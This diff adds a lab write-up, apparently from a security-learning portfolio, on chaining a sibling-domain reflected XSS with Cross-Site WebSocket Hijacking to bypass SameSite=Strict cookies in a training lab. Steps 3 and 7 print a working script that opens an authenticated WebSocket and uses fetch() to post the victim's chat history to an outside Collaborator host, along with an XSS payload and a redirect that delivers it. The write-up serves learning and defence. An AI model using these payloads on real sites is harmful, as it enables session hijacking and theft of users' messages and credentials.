@@ -788,4 +788,143 @@ flexibility quirks, rather than eliminating CSRF risk entirely.
 
 
 
-SameSite Strict bypass via sibling domain
+## Lab 9: SameSite Strict Bypass via Sibling Domain (CSWSH)
+
+Topic: Cross-Site Request Forgery / Cross-Site WebSocket Hijacking (CSWSH) | Difficulty: Expert
+
+## Vulnerability
+The live chat feature uses WebSockets, and the WebSocket handshake request
+contains no CSRF-style token — meaning if an attacker can establish a
+WebSocket connection using the victim's session, they can hijack it and
+read live chat data (Cross-Site WebSocket Hijacking, or CSWSH). However,
+the session cookie is set with `SameSite=Strict`, which should prevent
+this connection from being established cross-site at all. The eventual
+bypass required discovering an entirely separate XSS vulnerability on a
+"sibling" domain that the browser still treats as same-site.
+
+## What Is CSWSH?
+WebSockets establish a persistent, two-way connection, initiated via an
+HTTP handshake request. If that handshake doesn't include its own
+CSRF-style protection (like a token, separate from cookies), an attacker's
+page can open a WebSocket connection to the target site — and if the
+victim's session cookie is included in that handshake, the connection
+will be authenticated as the victim, allowing the attacker to receive any
+data the server sends over that socket (in this case, live chat history).
+
+## Steps Taken
+
+### Step 1: Confirm the WebSocket handshake lacks protection
+Sent a few messages in the live chat, then inspected the `GET /chat`
+WebSocket handshake request in Burp's Proxy history — confirmed no
+unpredictable token was present.
+
+### Step 2: Understand the READY message flow
+Refreshed the chat page and observed (via Burp's WebSockets history) that
+the client sends a `READY` message immediately after connecting, which
+causes the server to respond with the full chat history over the socket.
+
+### Step 3: Build and test a basic CSWSH proof-of-concept
+Using Burp Collaborator as an exfiltration endpoint, built:
+```html
+<script>
+    var ws = new WebSocket('wss://[lab-id].web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://[collaborator-id].oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+Testing this confirmed a WebSocket connection *could* be opened
+cross-site — but checking the handshake request afterward showed the
+session cookie was **not** included, because of the `SameSite=Strict`
+policy. This meant only a brand-new, unauthenticated session's (empty)
+chat history was exfiltrated — not useful on its own.
+
+### Step 4: Discover a same-site vulnerability via CORS headers
+Studied response headers in Burp's proxy history and noticed an
+`Access-Control-Allow-Origin` header revealing a **sibling domain**:
+`cms-[lab-id].web-security-academy.net`. Since this shares the same
+parent site structure, the browser treats it as same-site for SameSite
+cookie purposes, even though it's a technically different subdomain
+hosting entirely separate functionality (a CMS login form).
+
+### Step 5: Find and confirm a reflected XSS vulnerability on the sibling domain
+Visited the sibling CMS domain's login form and submitted arbitrary
+credentials, noticing the username was reflected in an "Invalid username"
+error message. Tested:
+<script>alert(1)</script>
+Confirmed this triggered a real, working reflected XSS vulnerability.
+
+### Step 6: Confirm the XSS-triggering request also works as GET
+Converted the `POST /login` request to GET in Burp Repeater, confirmed
+the same reflected XSS still fired, and copied the resulting URL —
+meaning the XSS could be triggered simply by visiting a crafted link.
+
+### Step 7: Combine XSS with the CSWSH script
+URL-encoded the entire CSWSH WebSocket script from Step 3, then embedded
+it as the `username` parameter in a link to the (same-site) sibling
+domain's vulnerable login page:
+```html
+<script>
+    document.location = "https://cms-[lab-id].web-security-academy.net/login?username=[URL-encoded CSWSH script]&password=anything";
+</script>
+```
+
+### Step 8: Confirm the session cookie is now included
+Testing this against my own session confirmed the resulting WebSocket
+handshake request **did** include the session cookie this time — because
+the request was initiated from the sibling CMS domain's own reflected
+XSS, which the browser correctly treats as same-site relative to the main
+application, satisfying `SameSite=Strict`.
+
+### Step 9: Deliver the full exploit chain to the victim
+Delivered the exploit — the victim's browser navigated to the malicious
+CMS login URL, triggered the reflected XSS (executing the embedded CSWSH
+script from a same-site context), opened an authenticated WebSocket
+connection using the victim's real session cookie, sent `READY`, and
+exfiltrated the victim's actual chat history to Burp Collaborator.
+
+### Step 10: Extract credentials from the exfiltrated chat history
+Polled Burp Collaborator and found a message within the victim's
+exfiltrated chat history containing their real username and password in
+plain text, then used these credentials to log directly into the
+victim's account, solving the lab.
+
+## Why This Bypasses SameSite=Strict
+`SameSite=Strict` blocks cookies on requests initiated from genuinely
+different sites — but two different **subdomains** under the same parent
+domain are still considered the "same site" for SameSite cookie purposes
+(same registrable domain). By finding an XSS vulnerability on a sibling
+subdomain (rather than the main application itself), the attack's
+WebSocket-opening code executes in a context the browser classifies as
+same-site, allowing the session cookie to be included, exactly as if the
+request had originated from the main application's own pages.
+
+## Result
+Successfully chained a missing WebSocket handshake protection, a
+same-site sibling-domain reflected XSS vulnerability, and SameSite=Strict
+cookie semantics to hijack the victim's live chat WebSocket connection,
+exfiltrate their real chat history via Burp Collaborator, extract their
+plaintext credentials, and log into their account, solving the lab.
+
+## What I Learned
+This was the single most complex vulnerability chain completed across
+the entire portfolio so far, combining concepts from three separate
+topics: Cross-Site WebSocket Hijacking (a distinct vulnerability class
+from traditional CSRF, applying the same "no request-origin verification"
+weakness to persistent WebSocket connections instead of one-off HTTP
+requests), XSS (used here not for its usual goals of cookie theft or
+credential capture directly, but purely as a same-site execution
+foothold), and SameSite cookie semantics (specifically that "same site"
+is evaluated at the registrable-domain level, meaning any subdomain under
+the same parent domain can serve as a launching point). This reinforces
+a critical, realistic security principle: an organization's overall
+security posture depends on the weakest same-site application in its
+entire domain structure — a seemingly unrelated, lower-priority subdomain
+(like a CMS login page) can become the exact stepping stone needed to
+defeat strong cookie protections on the organization's main, more
+carefully secured application. This is exactly the kind of multi-step,
+cross-application thinking that distinguishes genuine penetration testing
+methodology from testing a single application in isolation.
